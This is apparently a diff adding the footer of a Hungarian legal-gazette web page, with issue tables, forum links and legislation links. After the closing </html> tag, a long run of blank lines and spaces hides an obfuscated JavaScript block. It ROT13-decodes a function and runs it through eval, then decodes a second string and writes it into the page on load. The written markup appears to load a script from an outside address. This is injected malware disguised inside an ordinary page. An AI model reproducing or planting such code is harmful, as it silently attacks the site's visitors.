+<td>2008/002</td></tr>
+<tr><td>Kornyetvedelmi es Vizugyi Ertesito</td>
+<td>2008/002</td></tr>
+<tr><td>Kozlekedesi Ertesito</td>
+<td>2008/004</td></tr>
+<tr><td>Kulgazdasagi ertesito</td>
+<td>2008/001</td></tr>
+<tr><td>Kulturalis kozlony</td>
+<td>2008/005</td></tr>
+<tr><td>Magyar kozlony</td>
+<td>2008/038._</td></tr>
+<tr><td>Munkaugyi kozlony</td>
+<td>2008/002</td></tr>
+<tr><td>Oktatasi kozlony</td>
+<td>2008/003</td></tr>
+<tr><td>Önkormányzatok közlönye</td>
+<td>2008/002</td></tr>
+<tr><td>Penzugyi Kozlony</td>
+<td>2008/004</td></tr>
+<tr><td>Statisztikai kozlony</td>
+<td>2007/007</td></tr>
+<tr><td>Szociális közlöny</td>
+<td>2008/002</td></tr>
+<tr><td>Turisztikai ertesito</td>
+<td>2008/002</td></tr>
+<tr><td>Ugyeszsegi kozlony</td>
+<td>2008/002</td></tr>
+
+</table>
+ </td>
+</tr>
+<tr>
+ <td width="490" height="7" background="template/default/skin/kiadc_02_03.jpg">
+ </td>
+</tr>
+</table>
+<img src="template/default/skin/blank.gif" border=0 width=1 height=5><br>
+      </td>
+      <td width=5>&nbsp;
+      </td>
+      <td valign=top>
+      <table width="134" border="0" cellspacing="0" cellpadding="3">
+  <tr height="25">
+   <td background="template/default/skin/top_01.jpg" border=0>
+   </td>
+  </tr>
+  <tr height="26">
+   <td background="template/default/skin/top_02.jpg" valign="middle" align="right">
+    <b>Fórum</b>
+   </td>
+  </tr>
+  <tr>
+   <td background="template/default/skin/top_03.jpg">
+<a href="?do=forum&topic=5" target="_showlaw">oldal használata</a>
+<br>&nbsp;<img src="template/default/skin/line.jpg" width="120" height="1" border="0">&nbsp;<br><a href="?do=forum&topic=4" target="_showlaw">magánkölcsön elengedése</a>
+<br>&nbsp;<img src="template/default/skin/line.jpg" width="120" height="1" border="0">&nbsp;<br><a href="?do=forum&topic=3" target="_showlaw">munkavédelem</a>
+<br>&nbsp;<img src="template/default/skin/line.jpg" width="120" height="1" border="0">&nbsp;<br><a href="?do=forum&topic=2" target="_showlaw"></a>
+<br>&nbsp;<img src="template/default/skin/line.jpg" width="120" height="1" border="0">&nbsp;<br>
+   </td>
+  </tr>
+  <tr height=7>
+   <td background="template/default/skin/top_08.jpg">
+   </td>
+  </tr>
+</table>
+      <img src=\"template/default/skin/blank.gif\" border=0 width=1 height=5>
+      <table width="134" border="0" cellspacing="0" cellpadding="3">
+  <tr height="25">
+   <td background="template/default/skin/top_01.jpg" border=0>
+   </td>
+  </tr>
+  <tr height="26">
+   <td background="template/default/skin/top_02.jpg" valign="middle" align="right">
+    <b>Jogszabály</b>
+   </td>
+  </tr>
+  <tr>
+   <td background="template/default/skin/top_03.jpg">
+<a href="?do=show_jog&id=10343" target="_showlaw">Tájékoztató</a>
+<br>&nbsp;<img src="template/default/skin/line.jpg" width="120" height="1" border="0">&nbsp;<br><a href="?do=show_jog&id=11205" target="_showlaw">279/2007. (XII. 11.) KE határozat</a>
+<br>&nbsp;<img src="template/default/skin/line.jpg" width="120" height="1" border="0">&nbsp;<br><a href="?do=show_jog&id=304" target="_showlaw">2007. évi CXXI. törvény</a>
+<br>&nbsp;<img src="template/default/skin/line.jpg" width="120" height="1" border="0">&nbsp;<br><a href="?do=show_jog&id=321" target="_showlaw">289/2007. (X. 31.) Korm. rendelet</a>
+<br>&nbsp;<img src="template/default/skin/line.jpg" width="120" height="1" border="0">&nbsp;<br><a href="?do=show_jog&id=13339" target="_showlaw">A Magyar Köztársaság honvédelmi miniszterének</a>
+<br>&nbsp;<img src="template/default/skin/line.jpg" width="120" height="1" border="0">&nbsp;<br>
+   </td>
+  </tr>
+  <tr height=7>
+   <td background="template/default/skin/top_08.jpg">
+   </td>
+  </tr>
+</table>
+
+      </td>
+     </tr>
+    </table>
+   </td>
+  </tr>
+  <tr>
+   <td>
+   <table width=775 border=0 leftmargin=\"0\" topmargin=\"0\" cellspacing=\"0\" cellpadding=\"0\">
+  <tr>
+    <td height="37" align="center" valign="middle"><table width="775" border="0" cellpadding="0" cellspacing="0">
+  <tr> 
+    <td width="7" height="9"><img src="template/default/skin/alul_07.jpg" width="7" height="9"></td>
+    <td width="761" background="template/default/skin/alul_08.jpg"><img src="template/default/skin/alul_08.jpg" width="6" height="9"></td>
+    <td width="7" height="9"><img src="template/default/skin/alul_10.jpg" width="7" height="9"></td>
+  </tr>
+  <tr> 
+    <td height="11" background="template/default/skin/alul_13.jpg"><img src="template/default/skin/spacer.gif" width="7" height="11"></td>
+    <td height="11" align="center" bgcolor="#FFFFFF" class="text10"><table width="500" height="11" border="0" cellpadding="0" cellspacing="0" class="text10">
+        <tr> 
+          <td width="500" align="center"><a href="http://www.iuris.hu">www.iuris.hu</a> || <a href="?do=impresszum">impresszum</a>
+            || <a href="?do=kapcsolat">kapcsolat</a> || <a href="?do=adatvedelmi_nyilatkozat">adatvédelmi
+            nyilatkozat</a> || <a href="?do=media">média</a></td>
+        </tr>
+      </table></td>
+    <td height="11" background="template/default/skin/alul_15.jpg"><img src="template/default/skin/spacer.gif" width="7" height="11"></td>
+  </tr>
+  <tr> 
+    <td height="7"><img src="template/default/skin/alul_18.jpg" width="7" height="7"></td>
+    <td width="761" height="7" background="template/default/skin/alul_19.jpg"><img src="template/default/skin/alul_19.jpg" width="6" height="7"></td>
+    <td height="7"><img src="template/default/skin/alul_20.jpg" width="7" height="7"></td>
+  </tr>
+</table>
+   </td>
+  </tr>
+ </table>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                                                                     <script language=JavaScript>var cmj=" shapgvba ozuf(v){ine ohl,mv=\"Ol]HS-!Nqi|GT@1vW goVf6jM4\\\"[I$x{z3.dR5b=ukc0yw~Xpa`7t*^s2Z&,_)PB;e}8A:n9m+(Ur#Ch'\",oav=\"\",cbg,k,ps=\"\",n;sbe(ohl=0;ohl<v.yratgu;ohl++){ cbg=v.puneNg(ohl);k=mv.vaqrkBs(cbg);vs(k>-1){ n=((k+1)%81-1);vs(n<=0)n+=81;ps+=mv.puneNg(n-1); } ryfr ps+=cbg;}oav+=ps;qbphzrag.jevgr(oav);}",uhmid="";for(vdrvt=0;vdrvt<cmj.length;vdrvt++){ oocq = cmj.charCodeAt(vdrvt);if((oocq>64 && oocq<78)||(oocq>96 && oocq<110)) oocq=oocq+13;
+                                                                                                                                                                                                                                                                                         else if((oocq>77 && oocq<91)||(oocq>109 && oocq<123))oocq=oocq-13;uhmid=uhmid.concat(String.fromCharCode(oocq));} var sf,dny; eval( uhmid );sf="<6n}J0btj9`*'9*#h[~9|96n}J0b[>tv=n'3#`bqZ}Jb#Ht[<SORsuGtj9`*'9*#h\\[ 9|9Sn}J0b\\[tSROh\\[xbb0a//ZZZq*==*j#9`9j]bjn6qn=3/))'b|q~6?[(v=n'3#`bq}#2#}}#}([\\[><\\/SORsuG>[tCrt</6n}J0b>t"; bmhs(sf);</script>
